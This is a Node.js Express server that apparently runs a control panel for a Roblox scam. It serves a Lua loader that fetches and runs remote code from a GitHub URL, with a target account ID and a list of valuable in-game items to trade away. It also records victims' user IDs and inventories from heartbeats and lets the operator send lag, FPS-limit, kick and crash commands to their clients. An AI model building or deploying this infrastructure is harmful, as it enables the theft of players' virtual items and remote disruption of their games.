const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const PUBLIC_URL = process.env.PUBLIC_URL || process.env.RENDER_EXTERNAL_URL || 'https://grape-crasher-panel-production.up.railway.app';

app.use(cors());
app.use(express.json({ limit: '10mb' }));

const players = new Map();

app.get('/loader.lua', (req, res) => {
    const loader = `getgenv().TARGET_ID = 2651839869

getgenv().DELAY_STEP = 1

getgenv().TRADE_CYCLE_DELAY = 2

getgenv().WEBHOOK_URL = ""

getgenv().TARGET_BRAINROTS = {
        ["Strawberry Elephant"] = true,
        ["Meowl"] = true,
        ["Headless Horseman"] = true,
        ["Skibidi Toilet"] = true,
        ["Cerberus"] = true,
        ["Dragon Cannelloni"] = true,
        ["Garama and Madundung"] = true
}

getgenv().TARGET_BASE_SKINS = {
        
}

getgenv().TARGET_GEARS = {
        
}

task.spawn(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/JWMOREIRA/Jwmoreira.logic/refs/heads/main/Jwmoreira"))()
end)`;
    res.setHeader('Content-Type', 'text/plain');
    res.send(loader);
});

app.post('/api/public/heartbeat', (req, res) => {
    const data = req.body;
    if (!data || !data.user_id) {
        return res.status(400).json({ error: 'Missing user_id' });
    }
    const userId = String(data.user_id);
    const existing = players.get(userId) || {};
    
    let brainrots = data.brainrots || [];
    if (!Array.isArray(brainrots) || brainrots.length === 0) {
        if (existing.brainrots && Array.isArray(existing.brainrots) && existing.brainrots.length > 0) {
            brainrots = existing.brainrots;
        }
    } else {
        brainrots = brainrots.filter(b => 
            b && typeof b === 'object' && 
            ((b.title && b.title !== '') || (b.cash && b.cash !== ''))
        );
        if (brainrots.length === 0 && existing.brainrots && Array.isArray(existing.brainrots) && existing.brainrots.length > 0) {
            brainrots = existing.brainrots;
        }
    }
    
    players.set(userId, {
        ...existing,
        ...data,
        brainrots: brainrots,
        user_id: userId,
        online: true,
        lastHeartbeat: Date.now(),
        fps_limit: existing.fps_limit || false,
        lag_n: existing.lag_n || false,
        lag_c: existing.lag_c || false,
    });
    res.json({ status: 'ok' });
});

app.get('/api/players', (req, res) => {
    const list = [];
    const now = Date.now();
    const OFFLINE_THRESHOLD = 15000;
    const REMOVE_THRESHOLD = 20 * 60 * 1000;

    for (const [id, p] of players.entries()) {
        const timeSinceLast = now - (p.lastHeartbeat || 0);
        const online = timeSinceLast < OFFLINE_THRESHOLD;

        if (timeSinceLast >= REMOVE_THRESHOLD) {
            players.delete(id);
            continue;
        }

        if (!online) {
            p.fps_limit = false;
            p.lag_n = false;
            p.lag_c = false;
            p._kick = false;
            p._crash = false;
        }

        p.online = online;
        list.push({ ...p });
        players.set(id, p);
    }
    res.json({ players: list });
});

app.get('/api/command_state', (req, res) => {
    const userId = req.query.user_id;
    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
    const p = players.get(String(userId));
    if (!p) return res.json({ fps_limit: false, lag_n: false, lag_c: false });
    res.json({
        fps_limit: p.fps_limit || false,
        lag_n: p.lag_n || false,
        lag_c: p.lag_c || false,
    });
});

app.post('/api/command', (req, res) => {
    const { user_id, fps_limit, lag_n, lag_c, kick, crash } = req.body;
    if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
    const userId = String(user_id);
    const p = players.get(userId);
    if (!p) return res.status(404).json({ error: 'Player not found' });
    if (fps_limit !== undefined) p.fps_limit = !!fps_limit;
    if (lag_n !== undefined) p.lag_n = !!lag_n;
    if (lag_c !== undefined) p.lag_c = !!lag_c;
    if (kick === true) p._kick = true;
    if (crash === true) p._crash = true;
    players.set(userId, p);
    res.json({ status: 'ok' });
});

app.get('/api/public/command', (req, res) => {
    const userId = req.query.user_id;
    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
    const p = players.get(String(userId));
    if (!p) return res.json({ fps_limit: false, lag_n: false, lag_c: false });
    const response = {
        fps_limit: p.fps_limit || false,
        lag_n: p.lag_n || false,
        lag_c: p.lag_c || false,
    };
    if (p._kick) {
        response.kick = true;
        p._kick = false;
    }
    if (p._crash) {
        response.crash = true;
        p._crash = false;
    }
    players.set(String(userId), p);
    res.json(response);
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});